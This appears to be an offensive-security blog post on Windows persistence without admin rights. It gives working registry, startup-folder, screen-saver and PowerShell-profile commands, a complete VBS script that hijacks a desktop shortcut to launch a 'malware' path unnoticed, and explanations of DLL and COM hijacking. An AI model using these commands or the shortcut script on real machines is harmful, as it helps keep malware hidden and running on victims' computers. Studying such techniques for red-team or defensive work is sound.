---
title: "Windows Persistence"
classes: wide
header:
  teaser: /assets/images/persist.png
ribbon: DodgerBlue
description: "Windows Persistence vectors explanation"
categories:
  - Offensive
toc: true
---

# Non Privileged vector

## Startup Folder / Registry keys

This is a basic technique used a lot, it works by just adding your application in one of those places.

    copy "app path" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate /t REG_SZ /d "app path" /f

## Logon Script

when the user logs in there is a process called "userinit.exe" which does many things one of them is launching Logon Scripts.
you can create logon scripts with the following command...

    reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "script path" /t REG_SZ /f

## Shortcuts Modification

This is working by modifying the command launched by the shortcut."Don't forget to do that in a way that makes the shortcut behave as expected from the user"
here is a VBS script that does that. "don't forget to modify it based on your needs"

```java
' malware path
malware = ""
' the path of the actual script that will be launched "Created by the script"
executed_script = "exec.vbs"
' target shortcut name
lnkName = ""

' helper vars
set WshShell = WScript.CreateObject("WScript.Shell" )
' Chose the folder of the lnk file
strDesktop = WshShell.SpecialFolders("Desktop" )
set oShellLink = WshShell.CreateShortcut(strDesktop & "\" & lnkName )
origTarget = oShellLink.TargetPath
origArgs = oShellLink.Arguments
origIcon = oShellLink.IconLocation
origDir = oShellLink.WorkingDirectory

' persistence malwareation
Set FSO = CreateObject("Scripting.FileSystemObject")
Set File = FSO.CreateTextFile(executed_script,True)
File.Write "Set oShell = WScript.CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
File.Write "oShell.Run " & chr(34) & malware & chr(34) & vbCrLf
File.Write "oShell.Run " & chr(34) & oShellLink.TargetPath & " " & oShellLink.Arguments & chr(34) & vbCrLf
File.Close

oShellLink.TargetPath = executed_script
oShellLink.IconLocation = origTarget & ", 0"
oShellLink.WorkingDirectory = origDir
oShellLink.WindowStyle = 7
oShellLink.Save

```

## ScreenSavers

This technique is modifying "or adding if not exist" the value of the screen saver key in the registry to be our app so when the screen saver is triggered that will launch the app.
we can do that using the following commands...

    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "app path" /f
    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "10" /f

## Powershell Profile

This technique needs PowerShell to run something to be triggered.
In PowerShell, profiles are the settings that are saved in a specific folder which is run each time PowerShell is executed.
you can do that by the following command...

      echo "app path" > %HOMEPATH%"\Documents\windowspowershell\profile.ps1

## DLL Hijacking

Once you are in the device then you know the applications that are presented on this device, one way to find a way to persist in the machine is to test the already persistent apps used on the machine on your own machine looking for DLL hijacking vulnerabilities.

So What's DLL hijacking vulnerability?!

Once an application starts it tries to load its needed libraries, the vulnerability here comes when the app search order is looking for that library in a place we control before the actual place of the library and we can easily spot that using the Sysinternals tool "Procmon" using a good filter will make the process goes quickly."Don't forget to implement the actual functionality needed by the application on your malicious dll to prevent the app from crashing".

    Tip: You can filter the procmon search to automatically just show you the dlls that were searched and not found.

## COM Hijacking

Component Object Model (COM) COM is a platform-independent, distributed, object-oriented system for creating binary software components that can interact.

when the app needs to call a COM service it uses the following diagram

![error loading](/assets/images/com.png)

the SCM is given a GUID for the needed COM object and starts searching in the HKCU and will not go to HKLM if he found the needed COM object, and because we have all rights to right on HKCU we can hijack the flow and make the app loads our own dll.
we can use task schedular to look for potentially vulnerable apps by exporting its data and searching for the "ComHandler" tag with the "LogonTriger" tag, and search if that COM object is not presented in HKCU.

    schtasks /query /xml > tasks.xml
